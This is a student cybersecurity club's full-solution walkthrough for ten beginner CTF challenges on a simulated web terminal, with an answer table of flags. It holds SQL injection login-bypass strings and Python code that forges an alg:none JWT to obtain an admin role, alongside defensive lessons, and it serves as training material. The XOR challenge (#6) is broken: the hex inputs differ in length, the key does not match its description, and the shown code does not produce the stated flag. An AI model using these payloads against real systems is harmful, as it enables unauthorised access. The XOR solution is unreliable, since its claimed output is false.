# CTF walkthroughs — full solutions

Spoilers ahead. These are the "I'm stuck, just show me" answers — every challenge step-by-step. The intent is for officers to post one challenge per Discord message in a `#ctf-walkthroughs` thread that members open only when they need it.

> Each challenge writeup is sized to fit under Discord's 2000-char message limit, so you can copy a block straight into a message.

Run every command below in the page terminal at <https://barterclub.github.io/CybersecurityClub/> (or wherever the site lives). Type `ctf reset` first if you want a clean slate.

---

## #1 — recon (50 pts)

**Brief:** Some files leave secrets in plain sight. View Page Source — really. Search the HTML for `flag{`.

**Solve:**
1. Right-click anywhere → "View Page Source" (or Ctrl+U)
2. Ctrl+F for `flag{`
3. You'll find an HTML comment near the top of `<head>`:
   ```html
   <!-- CTF FLAG #1 — recon: this comment is right here in the HTML.
        flag{html_recon_is_step_one}
   -->
   ```
4. In the page terminal:
   ```
   flag flag{html_recon_is_step_one}
   ```

**Lesson:** HTML source is fully visible. Anything you put in a comment is on the public internet.

---

## #2 — console (75 pts)

**Brief:** When this page loaded, something printed to the browser's developer console. Open DevTools → Console tab.

**Solve:**
1. F12 → "Console" tab
2. Among the logs you'll see:
   ```
   [CTF #2] flag{console_log_is_loud}
   ```
3. ```
   flag flag{console_log_is_loud}
   ```

**Lesson:** `console.log()` is fully visible in DevTools. Treat it as a public broadcast — never log session tokens, API keys, or anything sensitive.

---

## #3 — base64 (100 pts)

**Brief:** Decode this: `ZmxhZ3tiNjRfaXNfbm90X2VuY3J5cHRpb259`

**Solve (option A — built-in command):**
```
base64 decode ZmxhZ3tiNjRfaXNfbm90X2VuY3J5cHRpb259
flag flag{b64_is_not_encryption}
```

**Solve (option B — Python REPL):**
```
python
import base64
base64.b64decode('ZmxhZ3tiNjRfaXNfbm90X2VuY3J5cHRpb259').decode()
exit()
flag flag{b64_is_not_encryption}
```

**Lesson:** Base64 is *encoding*, not *encryption*. It's reversible by anyone, no key needed. Two giveaways that something is base64: it ends in `=` padding, and it uses only `A-Z`, `a-z`, `0-9`, `+`, `/`.

---

## #4 — rot13 (100 pts)

**Brief:** Decode (ROT13): `synt{ebgngr_guvegrra_cynprf}`

**Solve (option A — built-in command):**
```
rot13 synt{ebgngr_guvegrra_cynprf}
flag flag{rotate_thirteen_places}
```

**Solve (option B — Python):**
```
python
import codecs
codecs.decode('synt{ebgngr_guvegrra_cynprf}', 'rot13')
exit()
flag flag{rotate_thirteen_places}
```

**Lesson:** ROT13 shifts each letter 13 places in the alphabet. Since the alphabet has 26 letters, applying ROT13 twice returns the original — it's its own inverse. It's a substitution cipher with a fixed key, so it offers zero security; it was originally a Usenet convention for hiding spoilers, not a serious cipher.

---

## #5 — obfuscation (150 pts)

**Brief:** There's a 5th flag hidden inside this page's JavaScript, assembled from string fragments. Read the code.

**Solve:**
1. View page source (Ctrl+U) or DevTools → Sources
2. Ctrl+F for `_x1` (or `_motto`)
3. You'll find:
   ```js
   const _x1 = 'flag{';
   const _x2 = 'string_';
   const _x3 = 'concat_';
   const _x4 = 'is_weak_';
   const _x5 = 'obfuscation';
   const _x6 = '}';
   const _motto = _x1 + _x2 + _x3 + _x4 + _x5 + _x6;
   ```
4. Concatenate them mentally (or paste into the `python` REPL): `flag{string_concat_is_weak_obfuscation}`
5. ```
   flag flag{string_concat_is_weak_obfuscation}
   ```

**Lesson:** Splitting a secret across variables in client-side code doesn't hide it — anyone can read the source and reassemble. Real protection lives behind a server you control or behind a key you don't ship to the client.

---

## #6 — xor (200 pts)

**Brief:** XOR these two hex strings together:
`0x1c1d090f1d4f4e1c1c100e15531f1700551b1f10110a16`
XOR
`0x7b7878787878787878787878787878787878787878787878`

**Solve:**
```
python
a = bytes.fromhex('1c1d090f1d4f4e1c1c100e15531f1700551b1f10110a16')
b = bytes.fromhex('7b7878787878787878787878787878787878787878787878')
bytes(x ^ y for x, y in zip(a, b)).decode()
exit()
flag flag{xor_is_just_addition_mod_2}
```

**Lesson:** XOR is reversible: if you know two of `a`, `b`, `result`, you can derive the third. The "key" here is `0x78` repeating, which is ASCII `'x'` — a one-character key offers basically no security. Real symmetric crypto (AES) uses keys you can't guess and modes that prevent pattern leakage.

---

## #7 — steganography (175 pts)

**Brief:** Sometimes data hides in HTML attributes. Inspect the `<body>` element. Anything... base64-shaped?

**Solve:**
1. F12 → "Elements" tab → click `<body>`
2. You'll see: `<body data-z="ZmxhZ3tjc3NfZGF0YV9hdHRyc19hcmVfdmlzaWJsZX0=">`
3. The trailing `=` is base64 padding. Decode:
   ```
   base64 decode ZmxhZ3tjc3NfZGF0YV9hdHRyc19hcmVfdmlzaWJsZX0=
   flag flag{css_data_attrs_are_visible}
   ```

**Lesson:** Custom `data-*` attributes are useful for client-side data passing but aren't private — they're inspectable. Anything sensitive needs to live behind a server.

---

## #8 — nmap_recon (125 pts)

**Brief:** A misconfigured service on this host is leaking secrets via its banner. First find out what host you're on, then scan it. Version strings can talk too much.

**Solve:**
```
ifconfig
```
Look at the `inet` line of `eth0`: **10.50.0.1**. That's the local host's IP.

```
nmap 10.50.0.1
```
At the bottom of the output you'll see an unusual port:
```
1337/tcp  open  ctf-banner  Banner: flag{nmap_finds_what_eyes_miss}
```

```
flag flag{nmap_finds_what_eyes_miss}
```

**Lesson:** Service banners often leak version info — sometimes more. In real pentests, port scanning + service enumeration is reconnaissance step one. Sanitize banner strings in production services so they don't tell attackers what software/version is running.

---

## #9 — sql_injection (150 pts)

**Brief:** There's a `login` command on this terminal that talks to a `users` table. The query string is printed before each attempt — read it carefully. Classic SQLi will get you in.

**Solve:**
```
login admin password
```
Output shows the SQL it built:
```
[debug] executing: SELECT * FROM users WHERE name='admin' AND pass='password'
Authentication failed
```

The `name` column is interpolated raw. Close the quote and comment out the password check:
```
login admin'-- ignored
```
Output:
```
[debug] executing: SELECT * FROM users WHERE name='admin'--' AND pass='ignored'
✓ query returned 1 row (auth check bypassed)
1   admin   root   flag{sql_injection_is_classic}
```

```
flag flag{sql_injection_is_classic}
```

**Alternate injection that also works:** `login admin' OR '1'='1 anything`

**Lesson:** Classic SQL injection lives where user input is concatenated into SQL. Defenses: parameterized queries, prepared statements, ORMs that escape automatically. Never build SQL with string concatenation. Bonus reading: OWASP A03:2021 — Injection.

---

## #10 — jwt_tamper (175 pts)

**Brief:** There's a `token` command that issues JWTs and a `whoami-jwt` command that authenticates them. Tokens carry `role=user`. The admin debug-note holds the flag — forge your way in.

**Solve:**

Step 1 — get a normal token:
```
token alice
```
Output: `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciIsImlhdCI6...`

Step 2 — see what's inside:
```
jwt-decode <paste-token>
```
You'll see `header: {"alg":"HS256","typ":"JWT"}` and `payload: {"user":"alice","role":"user",...}`.

Step 3 — try the obvious attack: just change `role` to `admin` and re-encode.
That fails — the HS256 signature won't match the tampered payload, and we don't know the secret.

Step 4 — read the verifier hint: `alg: none`. RFC 7519 §6.1 says `alg=none` means "no signature." A naive verifier accepts that. This one does. Build a forged token in Python:
```
python
import base64, json
def b64u(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
header  = b64u({"alg":"none","typ":"JWT"})
payload = b64u({"user":"alice","role":"admin"})
print(header + "." + payload + ".")
exit()
```
You get something like `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.` — note the trailing dot with **nothing after it** (that's the empty signature).

Step 5 — present it:
```
whoami-jwt eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.
```
Output:
```
[debug] alg = none
✓ signature accepted (alg=none)
Hello, alice (role: admin)

═══ ADMIN DEBUG PANEL ═══
  debug-note: flag{none_alg_strikes_again}
```

```
flag flag{none_alg_strikes_again}
```

**Lesson:** Real JWT libraries used to default to allowing `alg: none` (CVE-2015-9235 and friends). If a server didn't explicitly disallow it, attackers could mint tokens with whatever payload they wanted, no secret required. Modern libraries reject `alg: none` by default — but misconfigurations still happen, especially in services that support multiple algorithms (HS256 + RS256) where attackers can downgrade.

---

## All flags (for officer reference)

| # | Name | Pts | Flag |
|---|---|---|---|
| 1 | recon | 50 | `flag{html_recon_is_step_one}` |
| 2 | console | 75 | `flag{console_log_is_loud}` |
| 3 | base64 | 100 | `flag{b64_is_not_encryption}` |
| 4 | rot13 | 100 | `flag{rotate_thirteen_places}` |
| 5 | obfuscation | 150 | `flag{string_concat_is_weak_obfuscation}` |
| 6 | xor | 200 | `flag{xor_is_just_addition_mod_2}` |
| 7 | steganography | 175 | `flag{css_data_attrs_are_visible}` |
| 8 | nmap_recon | 125 | `flag{nmap_finds_what_eyes_miss}` |
| 9 | sql_injection | 150 | `flag{sql_injection_is_classic}` |
| 10 | jwt_tamper | 175 | `flag{none_alg_strikes_again}` |

**Total: 1300 points across 10 challenges.**
